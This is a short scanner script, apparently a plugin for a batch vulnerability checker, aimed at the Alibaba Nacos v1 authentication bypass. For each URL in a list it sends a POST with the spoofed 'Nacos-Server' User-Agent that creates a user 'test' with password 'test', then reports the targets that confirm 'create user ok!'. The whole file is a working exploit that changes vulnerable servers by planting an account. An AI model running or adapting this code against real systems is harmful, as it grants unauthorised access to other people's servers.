#request urls = array
#define payload = /nacos/v1/auth/users?username=test&password=test
#define bug = create user ok!
#define info = alibaba-nacos-v1-auth-bypass
function main(args)
{
	printclolor("当前正在检测:".info,1);
	i = 0;
	num = GetArrayNum(urls);
	while(i<num){
		url = urls[i];
		try{
			res = HttpPost(url.payload,"","User-Agent: Nacos-Server");
			if(StrFindStr(res[0],bug,0)!= "-1")
			{
				printclolor("[+]".urls[i].info,3);
			}
		}catch{
		}
		i = ToInt(i+1);
	}
}
